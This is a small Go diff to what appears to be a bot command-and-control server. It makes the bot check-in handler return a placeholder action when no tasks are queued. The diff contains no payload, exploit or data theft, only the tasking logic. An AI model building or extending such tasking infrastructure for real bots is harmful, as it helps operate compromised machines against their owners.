@@ -211,6 +211,15 @@ func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
 	if err != nil {
 		return 500, actList // issue querying actions
 	}
+	if len(acts) == 0 {
+		actProto := &mcs.Action{
+			Uuid: "a",
+			Mode: "0",
+			Args: "a",
+		}
+		actList = append(actList, actProto)
+		return 200, actList
+	}
 	for _, actn := range acts {
 		aUUID := actn.UUID
 		aMode := actn.Mode
